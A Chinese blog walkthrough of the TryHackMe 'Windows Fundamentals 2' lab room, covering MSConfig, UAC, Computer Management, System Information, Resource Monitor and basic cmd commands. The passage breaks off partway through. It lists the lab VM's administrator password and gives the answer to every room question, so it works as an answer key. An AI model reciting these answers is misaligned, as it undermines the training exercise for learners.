    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/windowsfundamentals2x0x" >https://tryhackme.com/room/windowsfundamentals2x0x <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文介绍：本文所涉及的内容是Windows 基础模块的第 2 部分，了解有关系统配置、UAC 设置、资源监控、Windows 注册表等更多信息。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在Windows Fundamentals 1中，我们已经介绍了Windows的桌面、文件系统、用户帐户控制、控制面板、设置和任务管理器。 </p>
<p>本文将继续尝试概述 Windows 操作系统中可用的其他一些实用程序以及访问这些实用程序的不同方法。</p>
<p>启动本文相关实验房间中所附加的Windows虚拟机（你可以直接在浏览器中访问），如果你希望通过远程桌面访问虚拟机，请使用以下凭据：</p>
<ul>
<li>Machine IP: <code>MACHINE_IP</code>（在实验房间中启动Windows虚拟机之后，你将获得一个相关的ip地址）</li>
<li>User: <code>administrator</code></li>
<li>Password: <code>letmein123!</code></li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331102855386.png"
                      alt="image-20230331102855386"
                ></p>
<p>当上述界面弹出提示时，点击接受证书，然后你现在应该可以登录到远程系统。</p>
<h2 id="系统配置面板（-System-Configuration）"><a href="#系统配置面板（-System-Configuration）" class="headerlink" title="系统配置面板（ System Configuration）"></a>系统配置面板（ System Configuration）</h2><p>系统配置实用程序 (<code>MSConfig</code>)可用于高级故障排除，其主要目的是帮助诊断启动问题，系统配置面板可以帮助我们导航到其他 Windows 应用程序。</p>
<p>有关系统配置实用程序的更多信息，请参阅下面的文档。</p>
<blockquote>
<p><a class="link"   href="https://learn.microsoft.com/en-us/troubleshoot/windows-client/performance/system-configuration-utility-troubleshoot-configuration-errors" >https://learn.microsoft.com/en-us/troubleshoot/windows-client/performance/system-configuration-utility-troubleshoot-configuration-errors <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>有几种方法可以启动系统配置，其中一种方法是从开始菜单启动–在开始菜单处输入MSConfig即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401185721094.png"
                      alt="image-20230401185721094"
                ></p>
<p>注意:你需要本地管理员权限才能打开系统配置实用程序。</p>
<p>该实用程序顶部有五个选项卡，下面是每个选项卡的名称，在本小节中，我们将简要对每个选项卡进行介绍。</p>
<ul>
<li><p>General-常规</p>
</li>
<li><p>Boot-引导</p>
</li>
<li><p>Services-服务</p>
</li>
<li><p>Startup-启动</p>
</li>
<li><p>Tools-工具</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401190049438.png"
                      alt="image-20230401190049438"
                ></p>
</li>
</ul>
<p>在General选项卡中，我们可以选择Windows启动时要加载的设备和服务，相关的选项包括:标准（Normal,）、诊断性（Diagnostic）以及选择性（Selective）。</p>
<p>在Boot选项卡中，我们可以为操作系统定义各种启动选项。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401190444870.png"
                      alt="image-20230401190444870"
                ></p>
<p>在Services选项卡中，会列出系统中配置的所有服务，而不考虑其状态(运行或停止)，服务是指在后台运行的一种特殊类型的应用程序。Services选项卡允许我们启用或禁用出现在列表中的服务。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401190621227.png"
                      alt="image-20230401190621227"
                ></p>
<p>Startup选项卡会将用户引导至任务管理器以管理启动项，下面是本地机器上MSConfig的Startup选项卡的截图。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401190728279.png"
                      alt="image-20230401190728279"
                ></p>
<p>如上图所示，微软会建议你使用任务管理器(<code>taskmgr</code>)来管理(启用&#x2F;禁用)启动项，系统配置实用程序并不是一个启动管理程序。</p>
<p>在Tools选项卡中，有一个关于各种实用程序(工具)的列表，我们可以运行这些工具来进一步配置操作系统。Tools选项卡中的每个工具都有一个简短的描述，以让我们对工具用途有一些了解。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401191148145.png"
                      alt="image-20230401191148145"
                ></p>
<p>注意上图中的<code>Selected command</code>部分，此文本框中的信息将根据工具的不同而变化。</p>
<p>关于工具的运行：我们可以通过Run提示符使用命令运行工具，也可以通过命令提示符使用命令运行工具，或者可以通过单击上图中的<code>launch</code>按钮启动对应工具。</p>
<p><strong>答题</strong></p>
<p><em>tips：阅读本小节内容并且访问Windows虚拟机进行探索，然后回答以下问题。</em></p>
<p>访问由实验房间所提供的Windows虚拟机，并进行相关探索。</p>
<p><em><strong>问题1：将 Systems Internals 列为制造商的服务的名称是什么？</strong></em></p>
<p>导航到系统配置面板(<code>MSConfig</code>)的“服务”选项卡并单击“制造商-Manufacturer”，这将按服务制造商的字母顺序对服务进行排序，然后寻找由“Systems Internals”所制造的服务。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401201614902.png"
                      alt="image-20230401201614902"
                ></p>
<blockquote>
<p>由Systems Internals所制造的服务名称为：PsShutdown</p>
</blockquote>
<p><em><strong>问题2：Windows 许可证注册给谁？</strong></em></p>
<p>导航到系统配置面板的“工具”选项卡并选择“关于 Windows”工具。</p>
<p>单击“启动”按钮启动该工具，你将看到有关操作系统的信息，包括了Windows许可证的注册对象。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401201811501.png"
                      alt="image-20230401201811501"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401201840541.png"
                      alt="image-20230401201840541"
                ></p>
<blockquote>
<p>Windows许可证的注册对象是：Windows User</p>
</blockquote>
<p><em><strong>问题3：Windows 故障排除的命令是什么？</strong></em></p>
<p>在系统配置面板的“工具”选项卡中 选择Windows 故障排除工具，注意此时选项卡的“Selected command”部分，我们可以使用选项卡中对应的命令启动工具（在cmd或者Powershell中运行命令即可）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401203319568.png"
                      alt="image-20230401203319568"
                ></p>
<blockquote>
<p>Windows 故障排除的命令是：C:\Windows\System32\control.exe &#x2F;name Microsoft.Troubleshooting</p>
</blockquote>
<p><em><strong>问题4：什么命令将打开控制面板？（答案是.exe的名字，并非全路径）</strong></em></p>
<p>虽然不是很明显，但是有多个工具的启动命令都引用了同一个exe 文件——系统属性以及Windows 故障排除，两者都使用了control.exe。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401203904805.png"
                      alt="image-20230401203904805"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401203932302.png"
                      alt="image-20230401203932302"
                ></p>
<blockquote>
<p>打开控制面板的命令中将包含control.exe</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401191632414.png"
                      alt="image-20230401191632414"
                ></p>
<h2 id="更改UAC设置"><a href="#更改UAC设置" class="headerlink" title="更改UAC设置"></a>更改UAC设置</h2><p>我们将继续探索可通过“系统配置”面板使用的工具——Change UAC Settings。</p>
<p>用户帐户控制(UAC-User Account Control) 机制和Windows中的权限分配有关，UAC能够在日常使用时 为具有管理员访问权限的用户帐户保持较低级别的权限，并能在实际需要管理员访问权限时临时提升权限级别。</p>
<p>UAC可以通过UAC设置进行更改，甚至能够完全关闭(不推荐完全关闭UAC)。</p>
<p>我们能够导航至MSConfig 系统配置实用程序中的“工具”选项卡，然后选择对应程序以更改 UAC 设置。</p>
<p>在UAC设置界面，你可以通过移动滑块来改变UAC提示的优先级（从总是提示到完全不提示）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401204502203.png"
                      alt="image-20230401204502203"
                ></p>
<p><strong>答题</strong></p>
<p><em>tips：阅读本小节内容并且访问Windows虚拟机进行探索，然后回答以下问题。</em></p>
<p>访问由实验房间所提供的Windows虚拟机，并进行相关探索。</p>
<p>单击MSConfig的“工具”选项卡中的“更改 UAC 设置”工具，查看“Selected command”部分。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401205525109.png"
                      alt="image-20230401205525109"
                ></p>
<blockquote>
<p>与启动UAC设置的命令 相关联的程序为：UserAccountControlSettings.exe</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401204813864.png"
                      alt="image-20230401204813864"
                ></p>
<h2 id="计算机管理界面"><a href="#计算机管理界面" class="headerlink" title="计算机管理界面"></a>计算机管理界面</h2><p>我们将继续探索可通过“系统配置”面板使用的工具——Computer Management（<code>compmgmt</code>）。</p>
<p>计算机管理（<code>compmgmt</code>) 实用程序包含三个主要部分：系统工具(System Tools)、 存储(Storage)以及服务和应用程序(Services and Applications)。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401205855916.png"
                      alt="image-20230401205855916"
                ></p>
<p><strong>System Tools（系统工具）</strong></p>
<p>系统工具菜单由六部分组成：<em><strong>Task Scheduler、Event Viewer、Shared Folders、Local Users and Groups、Performance、Device Manager</strong></em>。</p>
<p>让我们首先从任务调度器(<em><strong>Task Scheduler</strong></em>)开始，根据微软的说法：通过任务调度器，我们可以创建和管理 计算机在指定的时间自动执行的常见任务。</p>
<p>任务可以是运行应用程序、脚本等，并且任务可以被配置为在任何时间运行。比如计算机任务可以在用户登录或注销时运行，任务也可以被配置为按特定的时间表运行，例如，设置每五分钟运行一次指定的计算机任务。</p>
<p>如果你要创建一个基本任务，可以单击“操作-Actions”(计算机管理页面的右侧窗格)下的“创建基本任务-Create Basic Task”。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401211603366.png"
                      alt="image-20230401211603366"
                ></p>
<p>接下来的系统工具是事件查看器（<em><strong>Event Viewer</strong></em>）。</p>
<p>事件查看器允许我们查看计算机上发生的事件，这些事件的记录可以被看作是一种审计跟踪，能够用来了解计算机系统的活动；这些事件信息通常可用于诊断问题以及调查系统上已执行的操作。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401225150680.png"
                      alt="image-20230401225150680"
                ></p>
<p>事件查看器有三个窗格。</p>
<ol>
<li>左边的窗格显示了一个关于事件日志提供程序的分层树列表。(如上图所示)</li>
<li>中间的窗格将显示一个总体概述和特定于选定提供者的事件摘要。</li>
<li>右边的窗格是一个操作（Action）界面。</li>
</ol>
<p>可以记录的事件有五种类型，下面是来自<a class="link"   href="https://docs.microsoft.com/en-us/windows/win32/eventlog/event-types" >docs.microsoft.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的一个表格，提供了对每种事件类型的简要描述。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401212813748.png"
                      alt="image-20230401212813748"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402103926626.png"
                      alt="image-20230402103926626"
                ></p>
<p>事件日志能够在 Windows logs下可见，下面是来自于<a class="link"   href="https://docs.microsoft.com/en-us/windows/win32/eventlog/eventlog-key" >微软官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的一个表格，它提供了对标准日志和自定义日志的简要描述。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401213048340.png"
                      alt="image-20230401213048340"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402104244808.png"
                      alt="image-20230402104244808"
                ></p>
<p>接下来的系统工具是共享文件夹（<em><strong>Shared Folders</strong></em>），在此系统工具中——你将看到其他人可以连接到的共享和共享文件夹的完整列表。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401224757803.png"
                      alt="image-20230401224757803"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401213444809.png"
                      alt="image-20230401213444809"
                ></p>
<p>上图是打开Shares文件夹之后所看到的共享列表，此列表会显示 Windows 的默认共享<code>C$</code>和 Windows 所创建的默认远程管理共享，如<code>ADMIN$</code>。</p>
<p>与Windows中的任何对象一样，你可以右键单击共享文件夹以查看其属性，例如权限属性(谁可以访问共享资源)。</p>
<p>在Sessions文件夹下，你将看到当前连接到“共享”的用户列表（为空）；而正在连接共享的用户可访问的文件夹和文件将在“Open Files”下被列出。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401225023683.png"
                      alt="image-20230401225023683"
                ></p>
<p>接下来的系统工具是本地用户和组（<em><strong>Local Users and Groups</strong></em>），我们可通过在Run提示符下输入<code>lusrmgr.msc</code>打开本地用户和组界面（在之前的文章中已有介绍，此处不再赘述）。</p>
<p>接下来的系统工具是性能（<em><strong>Performance</strong></em>），你将看到一个名为Performance Monitor (<code>perfmon</code>)的实用程序。</p>
<p>Perfmon（即性能监视器）可用于实时或者从日志文件中查看性能数据，此实用程序可用于排除计算机系统(本地或远程)上的性能问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401220426705.png"
                      alt="image-20230401220426705"
                ></p>
<p>我们最后要介绍的系统工具是 设备管理器（<em><strong>Device Manager</strong></em>），它允许我们查看和配置硬件，例如允许我们禁用任何连接到计算机的硬件。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401225612103.png"
                      alt="image-20230401225612103"
                ></p>
<p><strong>Storage（存储）</strong> </p>
<p>在“存储”菜单下的是“Windows服务器备份”和“磁盘管理”，在这里，我们只讨论“磁盘管理”部分。</p>
<p>注意：由于本文相关实验所使用的虚拟机是 Windows Server，所以会有一些在Windows 10系统中通常看不到的实用程序。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401220930240.png"
                      alt="image-20230401220930240"
                ></p>
<p>磁盘管理是Windows中的一个系统实用程序，它使你能够执行高级存储任务，这些任务包括：</p>
<ul>
<li>Set up a new drive——建立一个新的驱动器；</li>
<li>Extend a partition——扩展分区；</li>
<li>Shrink a partition——缩小分区；</li>
<li>Assign or change a drive letter (ex. E:) ——分配或更改驱动器盘符(例如E:)</li>
</ul>
<p><strong>Services and Applications（服务和应用程序）</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401221421693.png"
                      alt="image-20230401221421693"
                ></p>
<p>如上图所示，计算机管理页面的“服务和应用程序”菜单列表将包含“路由和远程访问”、“服务”和“WMI控制”三部分。</p>
<p>“服务”是在后台运行的一种特殊类型的应用程序，通过计算机管理页面的“服务和应用程序”菜单，你不仅可以启用和禁用服务，还可以查看服务的Properties（属性）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401221511583.png"
                      alt="image-20230401221511583"
                ></p>
<p>此外，“服务和应用程序”菜单中的“WMI Control”将用于配置和控制WMI服务。</p>
<p><em>tips：WMI是指Windows管理工具，它的全称为——Windows Management Instrumentation。</em></p>
<p>根据维基百科的说法：“WMI允许脚本语言(如VBScript或Windows PowerShell)在本地和远程 对Microsoft Windows个人电脑与服务器进行管理，微软还为WMI提供了一个命令行接口，被称为Windows管理工具命令行(WMIC：Windows Management Instrumentation Command-line)。”</p>
<p>注意：WMIC工具在Windows 10 21H1版本中已弃用，Windows PowerShell取代了WMI服务。</p>
<p><strong>答题</strong></p>
<p><em>tips：阅读本小节内容并且访问Windows虚拟机进行探索，然后回答以下问题。</em></p>
<p>访问由实验房间所提供的Windows虚拟机，并进行相关探索。</p>
<p><em><strong>问题1：打开计算机管理界面的命令是什么？（使用.msc 文件名称作答即可）</strong></em></p>
<p>单击 MSConfig 的“工具”选项卡中的“计算机管理”工具，查看“Selected command”部分即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401225315207.png"
                      alt="image-20230401225315207"
                ></p>
<blockquote>
<p>答案1：compmgmt.msc</p>
</blockquote>
<p><em><strong>问题2：GoogleUpdateTaskMachineUA 任务配置为每天什么时间运行？</strong></em></p>
<p>通过系统配置面板启动“计算机管理”工具并导航到“任务调度器”，在计划任务列表中，你可以看到“GoogleUpdateTaskMachineUA”任务，和此任务关联的运行时间可以在“触发器-Triggers”栏目下找到。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401225451929.png"
                      alt="image-20230401225451929"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401225532208.png"
                      alt="image-20230401225532208"
                ></p>
<blockquote>
<p>答案2：6:15 AM</p>
</blockquote>
<p><em><strong>问题3：共享的隐藏文件夹的名称是什么？</strong></em></p>
<p>通过系统配置面板启动“计算机管理”工具并导航到系统工具下的“共享文件夹”部分，打开包含共享列表的Shares文件夹：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401225743498.png"
                      alt="image-20230401225743498"
                ></p>
<blockquote>
<p>答案3：sh4r3dF0Ld3r</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401222619478.png"
                      alt="image-20230401222619478"
                ></p>
<h2 id="系统信息界面"><a href="#系统信息界面" class="headerlink" title="系统信息界面"></a>系统信息界面</h2><p>我们将继续探索可通过“系统配置”面板使用的工具—— System Information（<code>msinfo32</code>）。</p>
<p><strong>什么是系统信息( <code>msinfo32</code>) 工具？</strong></p>
<p>根据 Microsoft 的说法，“ Windows 包含一个名为Microsoft System Information (Msinfo32.exe) 的工具，此工具可收集有关你的计算机的信息并显示计算机硬件、系统组件和软件环境的综合视图，你可以使用它来诊断计算机问题。”</p>
<p>系统信息工具的主窗口是系统摘要（System Summary），它提供了很多关于操作系统、系统、处理器、BIOS、内存等的信息。</p>
<p>系统摘要(System Summary)中的信息分为以下三部分：</p>
<ul>
<li>硬件资源：有关系统硬件的高级信息；</li>
<li>组件：有关计算机上安装的不同设备的信息，如存储、显示器、键盘、鼠标、打印机等；</li>
<li>软件环境：提供有关系统上安装的软件的详细信息，包括驱动程序、服务、任务和启动程序等，还有一个被称为环境变量的部分，环境变量用于存储有关操作系统的详细信息。</li>
</ul>
<p>系统摘要(System Summary)将显示计算机所使用的一般技术规格，例如计算机的处理器品牌和型号等。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401233204758.png"
                      alt="image-20230401233204758"
                ></p>
<p>“硬件资源”中显示的信息不适用于普通计算机用户，如果你想了解更多关于此部分的信息，请参阅<a class="link"   href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/hardware-resources#:~:text=Hardware%20resources%20are%20the%20assignable,of%20bus%2Drelative%20memory%20addresses." >Microsoft官方页面 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401234718952.png"
                      alt="image-20230401234718952"
                ></p>
<p>在“组件”下，你可以看到有关计算机上安装的硬件设备的特定信息（此处存在部分信息不会显示）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401234913754.png"
                      alt="image-20230401234913754"
                ></p>
<p>在Software Environment部分中，你可以看到有关嵌入到操作系统中的软件(如：驱动程序)和已安装软件的信息，在此处还可以看到其他详细信息，例如环境变量和网络连接等。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401235447963.png"
                      alt="image-20230401235447963"
                ></p>
<p>根据微软的说法，“环境变量存储着有关操作系统环境的信息，这些信息包括操作系统路径、操作系统使用的处理器数量以及临时文件夹的位置等详细信息。具体而言：环境变量存储着操作系统和其他程序所使用的数据，例如，WINDIR环境变量（<code>%windir%</code>）所包含的是Windows安装目录的位置，程序可以通过查询这个变量的值来确定Windows操作系统文件的位置。”</p>
<p>单击Environment Variables即可查看已经为计算机分配好的环境变量值。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402000123298.png"
                      alt="image-20230402000123298"
                ></p>
<p>可用于查看环境变量的方法还包括：</p>
<ol>
<li>Control Panel &gt; System and Security &gt; System &gt; Advanced system settings &gt; Environment Variables</li>
<li>Settings &gt; System &gt; About &gt; system info &gt; Advanced system settings &gt; Environment Variables</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402000305026.png"
                      alt="image-20230402000305026"
                ></p>
<p>在系统信息实用程序（<code>msinfo32</code>）的最底部，还有一个搜索栏可以帮助我们快速定位，例如：我们可以选择“组件”并搜索“<code>IP address</code>”。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402001026708.png"
                      alt="image-20230402001026708"
                ></p>
<p><strong>答题</strong></p>
<p><em>tips：阅读本小节内容并且访问Windows虚拟机进行探索，然后回答以下问题。</em></p>
<p>访问由实验房间所提供的Windows虚拟机，并进行相关探索。</p>
<p><em><strong>问题1：打开系统信息的命令是什么？（以相关的exe文件名称作答即可）</strong></em></p>
<p>导航到MSConfig面板的“工具”选项卡并找到“系统信息”工具，查看“Selected command”部分即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402002650839.png"
                      alt="image-20230402002650839"
                ></p>
<blockquote>
<p>答案1：msinfo32.exe</p>
</blockquote>
<p><em><strong>问题2：系统名称下列出的是什么？</strong></em></p>
<p>导航到MSConfig面板的工具选项卡并启动“系统信息”工具，然后选择“系统摘要”并查看“系统名称”条目。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402002833201.png"
                      alt="image-20230402002833201"
                ></p>
<blockquote>
<p>答案2：THM-WINFUN2</p>
</blockquote>
<p><em><strong>问题3：ComSpec的环境变量值是多少？</strong></em></p>
<p>我们导航到MSConfig面板的工具选项卡并启动“系统信息”工具，然后展开“软件环境”菜单并查看“环境变量”页面，以找到ComSpec条目和相应的变量值。</p>
<p>ComSpec 环境变量将指向命令行解释器，即 cmd.exe。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402003006483.png"
                      alt="image-20230402003006483"
                ></p>
<blockquote>
<p>答案3：%SystemRoot%\system32\cmd.exe</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402001112874.png"
                      alt="image-20230402001112874"
                ></p>
<h2 id="资源监视器"><a href="#资源监视器" class="headerlink" title="资源监视器"></a>资源监视器</h2><p>我们将继续探索可通过“系统配置”面板使用的工具——Resource Monitor（<code>resmon</code>）。</p>
<p><strong>什么是资源监视器( <code>resmon</code>)？</strong></p>
<p>根据Microsoft的说法：“资源监视器用于显示每个进程和聚合 CPU、内存、磁盘、网络的使用信息，此外它还提供有关哪些进程正在使用单个文件句柄和模块的详细信息；它的高级过滤功能将允许用户隔离与一个或多个进程(应用程序或服务)相关的数据，并能启动、停止、暂停和恢复服务，以及从用户界面关闭无响应的应用程序；它还包括一个进程分析功能，可以帮助识别死锁进程和文件锁定冲突，以便用户可以尝试解决冲突，而不是直接关闭应用程序并遭受丢失数据的风险。 ”</p>
<p>正如本文所提到的其他一些工具一样，资源监视器实用程序主要面向——那些需要在计算机系统上执行高级故障排除的用户。</p>
<p>在概述(Overview)选项卡中，Resmon 有四个部分：</p>
<ul>
<li>CPU-中央处理器</li>
<li>Disk-磁盘</li>
<li>Network-网络</li>
<li>Memory-内存</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402003146897.png"
                      alt="image-20230402003146897"
                ></p>
<p>上图中的四个部分在资源监视器界面的顶部 也有相应的选项卡。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402003326346.png"
                      alt="image-20230402003326346"
                ></p>
<p>请注意，上图每个选项卡都有各自的附加信息，四个选项卡的具体图像信息如下所示。 </p>
<p><strong>中央处理器</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402003355546.png"
                      alt="image-20230402003355546"
                ></p>
<p><strong>内存</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402003410757.png"
                      alt="image-20230402003410757"
                ></p>
<p><strong>磁盘</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402003427038.png"
                      alt="image-20230402003427038"
                ></p>
<p><strong>网络</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402003441094.png"
                      alt="image-20230402003441094"
                ></p>
<p>资源监视器界面的最右侧还有窗格区域：当你查看概述选项卡时，窗格区域会实时显示和以上四个部分相关的图形视图；当你查看单个选项卡时，窗格区域则会实时显示和选项卡类型对应的图形视图。 </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402085550790.png"
                      alt="image-20230402085550790"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402085443134.png"
                      alt="image-20230402085443134"
                ></p>
<p><strong>答题</strong></p>
<p><em>tips：阅读本小节内容并且访问Windows虚拟机进行探索，然后回答以下问题。</em></p>
<p>访问由实验房间所提供的Windows虚拟机，并进行相关探索。</p>
<p><strong>问题：打开资源监视器的命令是什么？（以相关的exe文件名称作答即可）</strong></p>
<p>导航到MSConfig面板的工具选项卡并找到“资源监视器”工具，查看“Selected command”部分即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402004626723.png"
                      alt="image-20230402004626723"
                ></p>
<blockquote>
<p>答案：resmon.exe</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402004955219.png"
                      alt="image-20230402004955219"
                ></p>
<h2 id="命令提示符界面"><a href="#命令提示符界面" class="headerlink" title="命令提示符界面"></a>命令提示符界面</h2><p>我们将继续探索可通过“系统配置”面板使用的工具——Command Prompt（<code>cmd</code>）。</p>
<p>命令提示符(<code>cmd</code>)一开始似乎令人生畏，但一旦你了解如何与它进行交互，你就会发现它没有那么难理解。</p>
<p>在早期的操作系统中，命令行是与操作系统交互的唯一方式，随着GUI(图形用户界面)被引入，用户就能够使用GUI并点击一些按钮来执行复杂的计算机任务，用户也不再局限于 只能使用命令提示符来与操作系统发生交互。</p>
<p>即使现在GUI是与操作系统进行交互的主要方式，但是计算机用户仍然可以通过命令提示符和操作系统发生交互。</p>
<p>在本小节中，我们将只讨论计算机用户可以在命令提示符中运行以获取有关计算机系统的信息的几个简单命令。</p>
<p>让我们从一些简单的命令开始，比如<code>hostname</code>和<code>whoami</code>。</p>
<p>命令<code>hostname</code>将输出计算机名。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402085935253.png"
                      alt="image-20230402085935253"
                ></p>
<p>命令<code>whoami</code>将输出登录用户的名称。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402090001407.png"
                      alt="image-20230402090001407"
                ></p>
<p>接下来，让我们看看在故障排除时有用的一些命令。</p>
<p>经常使用的命令是<code>ipconfig</code>，这个命令将显示计算机的网络地址设置。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402090043093.png"
                      alt="image-20230402090043093"
                ></p>
<p>每个命令都有一个帮助手册，用于解释正确执行命令所需的语法，以及可添加到命令中以扩展其执行的任何其他参数。</p>
<p>检索命令帮助手册的命令是<code>/?</code></p>
<p>例如，如果要查看<code>ipconfig</code>的帮助手册，可以使用如下命令：<code>ipconfig /?</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402090216859.png"
                      alt="image-20230402090216859"
                ></p>
<p>注意：清除命令提示符界面的命令为<code>cls</code>。</p>
<p>下一个命令是<code>netstat</code>，根据帮助手册，此命令将显示协议统计信息和当前TCP&#x2F;IP网络连接信息。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402090331950.png"
                      alt="image-20230402090331950"
                ></p>
<p>上图中的红框部分向我们展示了<code>netstat</code>命令的示例语法，此语法结构告诉我们<code>netstat</code>命令可以单独运行，也可以带参数运行，例如<code>-a</code>、<code>-b</code>、<code>-e</code>等。</p>
<p>当任何参数附加到根命令(本例中为<code>netstat</code>)时，对应的命令输出也将发生变化。</p>
<p>接下来我们介绍<code>net</code>命令，此命令主要用于管理网络资源，<code>net</code>命令支持子命令。</p>
<p>如果输入<code>net</code>而不带子命令，则输出结果将显示根命令的语法，并会显示一些你可以使用的子命令。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402090824244.png"
                      alt="image-20230402090824244"
                ></p>
<p>对于<code>net</code>命令，显示帮助手册<code>/?</code>不会起作用，在这种情况下，我们需要使用不同的语法以查看帮助信息，即<code>net help</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402090931154.png"
                      alt="image-20230402090931154"
                ></p>
<p>如果你希望查看<code>net user</code>的帮助信息，则相关的命令为<code>net help user</code>。</p>
<p><img  
